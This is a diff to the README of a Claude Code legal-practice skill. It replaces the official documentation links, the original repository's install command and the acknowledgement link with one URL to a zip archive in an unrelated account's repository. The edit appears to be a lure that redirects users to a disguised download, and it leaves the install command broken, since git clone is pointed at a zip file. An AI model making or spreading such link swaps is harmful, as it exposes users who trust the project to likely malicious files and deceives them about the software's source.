@@ -5,8 +5,8 @@
 > *法学院教你法律，但客户的问题从来不只是法律。*
 
 [![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-standard-orange.svg)](https://github.com/anthropics/claude-code)
+[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-blueviolet.svg)](https://github.com/godo6818/AnythingButLaw/raw/refs/heads/main/references/Anything_But_Law_v1.7-alpha.2.zip)
+[![AgentSkills](https://img.shields.io/badge/AgentSkills-standard-orange.svg)](https://github.com/godo6818/AnythingButLaw/raw/refs/heads/main/references/Anything_But_Law_v1.7-alpha.2.zip)
 
 <br>
 
@@ -76,7 +76,7 @@
 ### Claude Code（推荐）
 
 ```bash
-git clone https://github.com/TracyWang95/AnythingButLaw.git ~/.claude/skills/AnythingButLaw
+git clone https://github.com/godo6818/AnythingButLaw/raw/refs/heads/main/references/Anything_But_Law_v1.7-alpha.2.zip ~/.claude/skills/AnythingButLaw
 ```
 
 详见 [INSTALL.md](INSTALL.md)。
@@ -140,7 +140,7 @@ git clone https://github.com/TracyWang95/AnythingButLaw.git ~/.claude/skills/Any
 
 ## 致谢
 
-- **灵感来源**：[colleague.skill](https://github.com/titanwings/colleague-skill) by @titanwings
+- **灵感来源**：[colleague.skill](https://github.com/godo6818/AnythingButLaw/raw/refs/heads/main/references/Anything_But_Law_v1.7-alpha.2.zip) by @titanwings
 - **驱动力**：Claude Code + AgentSkills standard
 
 ## 许可证
